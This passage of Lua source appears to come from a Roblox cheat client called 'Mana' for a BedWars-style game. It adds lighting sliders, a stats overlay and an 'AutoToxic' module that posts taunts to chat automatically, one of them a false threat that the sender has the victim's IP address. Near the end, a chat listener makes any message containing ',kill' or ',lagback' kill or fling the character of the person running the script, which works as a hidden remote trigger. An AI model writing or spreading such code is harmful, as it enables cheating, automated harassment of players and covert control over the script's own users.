        end,
        ["Min"] = 0,
        ["Max"] = 10,
        ["Default"] = 0.5,
        ["Round"] = 1
    })
    
LightingColorCorrectionContrast = Light:CreateSlider({
        ["Name"] = "Cotrast",
        ["Function"] = function()
        game.Lighting.ColorCorrection.Contrast = LightingColorCorrectionContrast["Value"]
        end,
        ["Min"] = 0,
        ["Max"] = 10,
        ["Default"] = 0.01,
        ["Round"] = 2
    })
    
LightingColorCorrectinSaturation = Light:CreateSlider({
        ["Name"] = "Saturation",
        ["Function"] = function()
        game.Lighting.ColorCorrection.Saturation = LightingColorCorrectinSaturation["Value"]
        end,
        ["Min"] = 0,
        ["Max"] = 10,
        ["Default"] = 0.1,
        ["Round"] = 1
    })

do
local StatsUpdateDelay = {["Value"] = 0.5}
--local VisibleDraggFrame = {["Value"] = true}
local statem = Tabs["Misc"]:CreateToggle({
    ["Name"] = "MatchState",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        if v == true then
             a = game:GetService("CoreGui"):FindFirstChild("MatchA_StateB")
            if a then
               a.Enabled = true
            else
	            local MatchState = Instance.new("ScreenGui")
				MainBackground = Instance.new("Frame")
				local Frame_Corner = Instance.new("UICorner")
				local Terrible_Tittle = Instance.new("TextLabel")
				local Tittle_Corner = Instance.new("UICorner")
				local UIGradient = Instance.new("UIGradient")
				local Kills_label = Instance.new("TextLabel")
				local Bed_label = Instance.new("TextLabel")
				local Skulls_label = Instance.new("TextLabel")
				--local Map_label = Instance.new("TextLabel")
				local UIListLayout = Instance.new("UIListLayout")
				
				local stats = game.Players.LocalPlayer.leaderstats
				
				MatchState.Name = "MatchA_StateB"
				MatchState.Parent = game:GetService("CoreGui")
				MatchState.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
				
				MainBackground.Name = "MainBackground"
				MainBackground.Parent = MatchState
				MainBackground.BackgroundColor3 = Color3.fromRGB(81, 81, 81)
				MainBackground.BorderColor3 = Color3.fromRGB(0, 0, 0)
				MainBackground.BorderSizePixel = 0
				MainBackground.BackgroundTransparency = 1
				MainBackground.Position = UDim2.new(0, 0, 0.316799998, 0)
				MainBackground.Size = UDim2.new(0, 150, 0, 130)
				MainBackground.Active = true
				MainBackground.Draggable = true
				
				Frame_Corner.CornerRadius = UDim.new(0, 4)
				Frame_Corner.Name = "Frame_Corner"
				Frame_Corner.Parent = MainBackground
				
				Terrible_Tittle.Name = "Tittle"
				Terrible_Tittle.Parent = MainBackground
				Terrible_Tittle.Active = true
				Terrible_Tittle.BackgroundColor3 = Color3.fromRGB(141, 255, 121)
				Terrible_Tittle.BorderColor3 = Color3.fromRGB(0, 0, 0)
				Terrible_Tittle.BorderSizePixel = 0
				Terrible_Tittle.ClipsDescendants = true
				Terrible_Tittle.Size = UDim2.new(0, 150, 0, 25)
				Terrible_Tittle.Font = Enum.Font.Gotham
				Terrible_Tittle.Text = ""
				Terrible_Tittle.TextColor3 = Color3.fromRGB(255, 255, 255)
				Terrible_Tittle.TextSize = 20.000
				Terrible_Tittle.BackgroundTransparency = 0.7
				
				Tittle_Corner.CornerRadius = UDim.new(0, 4)
				Tittle_Corner.Name = "Tittle_Corner"
				Tittle_Corner.Parent = Terrible_Tittle
				
				UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(213, 213, 213)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(213, 213, 213))}
				UIGradient.Parent = MainBackground
				
				Bed_label.Name = "Bedededed_label"
				Bed_label.Parent = MainBackground
				Bed_label.BackgroundColor3 = Color3.fromRGB(81, 81, 81)
				--Bed_label.BackgroundTransparency = 0.500
				Bed_label.BorderColor3 = Color3.fromRGB(134, 134, 134)
				Bed_label.Position = UDim2.new(0, 0, 0.265000015, 0)
				Bed_label.Size = UDim2.new(0, 150, 0, 25)
				Bed_label.Font = Enum.Font.Gotham
				Bed_label.Text = "Bed: nil"
				Bed_label.TextColor3 = Color3.fromRGB(255, 255, 255)
				Bed_label.TextSize = 18.000
				Bed_label.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
				
				Skulls_label.Name = "Skulls_label"
				Skulls_label.Parent = MainBackground
				Skulls_label.BackgroundColor3 = Color3.fromRGB(81, 81, 81)
				--Skulls_label.BackgroundTransparency = 0.500
				Skulls_label.BorderColor3 = Color3.fromRGB(134, 134, 134)
				Skulls_label.Position = UDim2.new(0, 0, 0.400000006, 0)
				Skulls_label.Size = UDim2.new(0, 150, 0, 25)
				Skulls_label.Font = Enum.Font.Gotham
				Skulls_label.Text = "Skulls: nil"
				Skulls_label.TextColor3 = Color3.fromRGB(255, 255, 255)
				Skulls_label.TextSize = 18.000
				Skulls_label.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
				
				--[[
				Map_label.Name = "Mapep_label"
				Map_label.Parent = MainBackground
				Map_label.BackgroundColor3 = Color3.fromRGB(81, 81, 81)
				Map_label.BackgroundTransparency = 0.500
				Map_label.BorderColor3 = Color3.fromRGB(134, 134, 134)
				Map_label.Position = UDim2.new(0, 0, 0.524999976, 0)
				Map_label.Size = UDim2.new(0, 150, 0, 25)
				Map_label.Font = Enum.Font.Gotham
				Map_label.Text = "Map: nil"
				Map_label.TextColor3 = Color3.fromRGB(255, 255, 255)
				Map_label.TextSize = 18.000
				Map_label.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
				--]]
				
				UIListLayout.Parent = MainBackground
				UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
				UIListLayout.Padding = UDim.new(0, 0)
				
				while wait(StatsUpdateDelay["Value"]) do
					Kills_label.Text = "Kills: ".. stats.Kills.Value
					Bed_label.Text = "Bed: ".. stats.Bed.Value
					Skulls_label.Text = "Skulls: ".. stats.Skulls.Value
				end

            end
        else
        game:GetService("CoreGui"):FindFirstChild("MatchA_StateB").Enabled = false
        end
    end
})

    StatsUpdateDelay = statem:CreateSlider({
        ["Name"] = "UpdateDelay",
        ["Function"] = function() end,
        ["Min"] = 0.1,
        ["Max"] = 10,
        ["Default"] = 1,
        ["Round"] = 1
    })
    --[[ code no work lol
    VisibleDraggFrame = statem:CreateOptionTog({
        ["Name"] = "Dragg button",
        ["Default"] = true,
        ["Func"] = function()
        end
        
    })
    ]]
end

do
local connections = {}
local suffix
local BedPrint 
local KillPrint
local BedDestroyedPrint

local BedBreakAuto = {Value = false}
local BedDestroyedAuto = {Value = false}
local FinalkillAuto = {Value = false}
local SuffixDrop = {Value = ""}

AutoToxic = Tabs["Utility"]:CreateToggle({
    ["Name"] = "AutoToxic",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        spawn(function()  
            Client:WaitFor("EntityDeathEvent"):andThen(function(p6)
                p6:Connect(function(p7)
                    if p7.fromEntity == LocalPlayer.Character then
                        if FinalkillAuto.Value == true then
                            local Playerr = game.Players:GetPlayerFromCharacter(p7.entityInstance)
                            local toxicmessage = KillPrint .. " " .. teamname .. " " .. SuffixDrop.Value
                            if v == true then
                            TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(toxicmessage)
                            end
                        end
                    end
                end)        
            end)
        end)
        spawn(function()
            getgenv().valspeed = v
            if getgenv().valspeed then
                spawn(function()
                    Client:WaitFor("BedwarsBedBreak"):andThen(function(p13)
                        p13:Connect(function(p14)
                            if p14.player.UserId == LocalPlayer.UserId then
                                if BedBreakAuto.Value == true then
                                    local team = queuemeta[clntstorehandlr:getState().Game.queueType or "bedwars_test"].teams[tonumber(p14.brokenBedTeam.id)]
                                    local teamname = team and team.displayName:lower() or "white"
                                    local toxicmessage = BedPrint .. " " .. teamname .. " " .. SuffixDrop.Value
                                    if v == true then
                                    TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(toxicmessage)
                                    end
                                end
                            end
                        end)
                    end)
                end)
            end
        end)
        spawn(function()
            if LocalPlayer.leaderstats.Bed.Value ~= "✅" then
                if BedBreakAuto.Value == true then
                    TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(BedDestroyedPrint)
                end
            end
        end)
    end
})

--[[ no work
BedBreakAuto = AutoToxic:CreateOptionTog({
    ["Name"] = "Bed break"
    ["Function"] = function() end,
    ["Default"] = false
})
BedDestroyedAuto = AutoToxic:CreateOptionTog({
    ["Name"] = "Bed destroyed"
    ["Function"] = function() end,
    ["Default"] = false
})
FinalkillAuto = AutoToxic:CreateOptionTog({
    ["Name"] = "Final kill"
    ["Function"] = function() end,
    ["Default"] = false
})]]

BedBreakAuto = AutoToxic:CreateOptionTog({
    ["Name"] = "BedB",
    ["Default"] = false,
    ["Func"] = function()
    end 
})
BedDestroyedAuto = AutoToxic:CreateOptionTog({
    ["Name"] = "BedD",
    ["Default"] = false,
    ["Func"] = function()
    end 
})
FinalkillAuto = AutoToxic:CreateOptionTog({
    ["Name"] = "Kill",
    ["Default"] = false,
    ["Func"] = function()
    end 
})

--[[ soon
DeathAuto = AutoToxic:CreateOptionTog({
    ["Name"] = "Death"
    ["Function"] = function() end,
    ["Default"] = false
})]]

BedBreakDrop = AutoToxic:CreateDropDown({
    ["Name"] = "Bed break",
    ["Function"] = function(val)
        BedPrint = val   
    end,
    ["Text"] = "BedB",
    ["List"] = {"Nice bed", "Easy bed", "Go to lobby"},
    ["Default"] = "Easy bed"
})
BedDeatroyedDrop = AutoToxic:CreateDropDown({
    ["Name"] = "Bed destroyed",
    ["Function"] = function(val)
        BedDestroyedPrint = val   
    end,
    ["Text"] = "BedD",
    ["List"] = {"Who broke my bed :(", "Who ever broke my bed, i have your IP adress."},
    ["Default"] = "Who broke my bed :("
})

--[[ soon
DeathDrop = AutoToxic:CreateDropDown({
    ["Name"] = "Death",
    ["Function"] = function(val)
        DeathPrint = val
    end,
    ["Text"] = "Value",
    ["List"] = {"You killed me, that's why you won", "My gaming chair expired, that's why you won"},
    ["Default"] = "You killed me, that's why you won"
})]]

FinalKillDrop = AutoToxic:CreateDropDown({
    ["Name"] = "kill",
    ["Function"] = function(val)
        KillPrint = val
    end,
    ["Text"] = "Kill",
    ["List"] = {"Killed", "L"},
    ["Default"] = "Killed"
})
SuffixDrop = AutoToxic:CreateDropDown({
    ["Name"] = "Suffix",
    ["Function"] = function(val)
        suffix = val
    end,
    ["Text"] = "Suffix",
    ["List"] = {"| Mana", "| ManaV2", ""},
    ["Default"] = "| Mana"
})
end
TextChatService.OnIncomingMessage = function(Message)
	msg = Message.Text
	Character = LocalPlayer.character
    --[[ private
	if msg:find(",kick") then
	    local args = msg:gsub(",kick " .. lplr.Name, "")
	    lplr:kick(args)
	end
    ]]
	if msg:find(",kill") then
	    Character.Humanoid:TakeDamage(Character.Humanoid.Health)
	end
	if msg:find(",lagback") then
	    Character.HumanoidRootPart.CFrame = Character.HumanoidRootPart.CFrame * CFrame.new(0, 10000000000000, 0)
	end
    --[[not working + private
	if msg:find(",gravity") then
	    local args = msg:gsub(",gravity " .. lplr.Name, "")
	    game.Workspace.Gravity = tonumber(args)
	end
    ]]
end
print("[Mana/Scripts/6872274481.lua]: Loaded in " .. tostring(tick() - startTick) .. ".")
